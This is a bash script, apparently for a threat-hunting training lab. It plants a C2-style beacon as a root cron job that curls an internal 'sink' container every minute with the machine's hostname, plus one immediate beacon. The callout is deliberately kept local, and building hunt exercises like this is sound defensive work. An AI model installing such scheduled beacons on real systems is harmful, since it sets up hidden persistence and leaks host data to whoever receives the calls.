#!/usr/bin/env bash
# Declawed plant: a cron beacon that calls ONLY the local sink container.
#
# The callback target is hardcoded to the internal compose service 'sink' on
# port 9000. It cannot reach the internet: there is no external address here,
# and the sink simply logs the hit. This reproduces the detection surface of a
# C2 beacon (a periodic, scheduled outbound call) with zero real callout.
set -euo pipefail

SINK_URL="http://sink:9000/beacon"   # internal compose DNS name only
CRON="/etc/cron.d/beaconhunt-sync"

cat > "$CRON" <<EOF
# beaconhunt-beacon (training) — periodic callback to the LOCAL sink only
* * * * * root curl -fsS --max-time 3 "${SINK_URL}?host=\$(hostname)" >/dev/null 2>&1
EOF
chmod 644 "$CRON"
echo "wrote $CRON (beacons to ${SINK_URL})"

# Also fire one immediate beacon so `ss -tnp` can catch it during a hunt,
# ignoring failures if the sink is not up yet.
curl -fsS --max-time 3 "${SINK_URL}?host=$(hostname)&bootstrap=1" >/dev/null 2>&1 || true
